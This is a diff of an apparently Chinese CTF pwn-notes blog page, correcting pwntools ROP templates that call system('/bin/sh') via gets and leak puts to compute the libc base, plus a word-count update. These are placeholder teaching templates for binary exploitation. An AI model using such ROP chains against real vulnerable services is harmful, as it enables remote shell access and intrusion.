@@ -781,10 +781,10 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 pop_rdi_ret <span class="token operator">=</span> 
 buf <span class="token operator">=</span> 
 gets_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>
-system <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
 p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ?
-p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets<span class="token punctuation">)</span>	<span class="token comment">#gets(buf)</span>
-p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>	<span class="token comment">#system(buf)</span>
+p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span>	<span class="token comment">#gets(buf)</span>
+p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>	<span class="token comment">#system(buf)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
@@ -796,6 +796,7 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 <p>接收该地址：基本就是一个固定用法<code>u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))</code></p>
 </li>
 <li><p>获取<code>libc</code>基址</p>
+<p>标志：64位以<code>7f</code>开头，基址末尾三位是0</p>
 <p>已知<code>puts</code>函数的真实地址和<code>puts</code>函数的偏移，<code>libc</code>的基址就等于真实地址减偏移</p>
 <p>获取<code>puts</code>函数在<code>libc</code>中的偏移可以通过<code>libc = ELF(&#39;libc文件&#39;)</code>，然后<code>libc.sym[&#39;puts&#39;]</code>得到<code>puts</code>偏移</p>
 <p>在打本地的时候如果修改了<code>libc</code>版本需要对应修改<code>ELF</code>里的文件路径，也可以直接在本地打通之后修改文件路径为远程的<code>libc</code>文件后直接打远程</p>
@@ -811,7 +812,7 @@ pop_rdi_ret <span class="token operator">=</span>
 main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
 puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
 puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
+p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
 
 libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc文件路径'</span><span class="token punctuation">)</span>
@@ -1140,7 +1141,7 @@ p <span class="token operator">+=</span> p64<span class="token punctuation">(</s
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">155.6k</span>&nbsp;字
+                class="white-color">155.7k</span>&nbsp;字
             
             
             
